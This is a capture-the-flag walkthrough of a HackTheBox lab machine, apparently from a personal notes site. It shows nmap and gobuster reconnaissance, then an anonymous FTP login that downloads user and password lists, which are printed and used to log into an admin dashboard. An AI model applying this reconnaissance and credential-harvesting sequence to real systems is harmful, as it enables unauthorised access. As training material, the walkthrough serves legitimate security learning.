---
title: Cocrodile - A HackTheBox machine 
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - walkthrough
---

# Cocrodile - A HackTheBox machine 


```bash
nmap -sC -A $ip -Pn
```

Results:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Smash - Bootstrap Business Template
Service Info: OS: Unix
```

Now we enumerate directories:

```bash
gobuster dir -e -u http://10.129.1.15/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -r 
```

Results:

```
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.1.15/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Follow Redirect:         true
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/05/01 16:21:20 Starting gobuster in directory enumeration mode
===============================================================
http://10.129.1.15/assets               (Status: 200) [Size: 1703]
http://10.129.1.15/css                  (Status: 200) [Size: 1350]
http://10.129.1.15/js                   (Status: 200) [Size: 1138]
http://10.129.1.15/fonts                (Status: 200) [Size: 1968]
http://10.129.1.15/dashboard            (Status: 200) [Size: 1577]
http://10.129.1.15/server-status        (Status: 403) [Size: 276]
Progress: 220534 / 220561 (99.99%)
===============================================================
2023/05/01 16:29:51 Finished
===============================================================
```

At the same time, we explore ftp service. Anonymous login is allowed.

```bash
ftp 10.129.1.15 
dir
mget *
```

Two files are downloaded. 

```bash
cat allowed.userlist
```

Results:

```
aron
pwnmeow
egotisticalsw
admin
```

And passwords:

```bash
cat allowed.userlist.passwd 
```

Results:

```
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

Now we can enter in http://10.129.1.15/dashboard with credentials for admin. Flag is in the main panel.


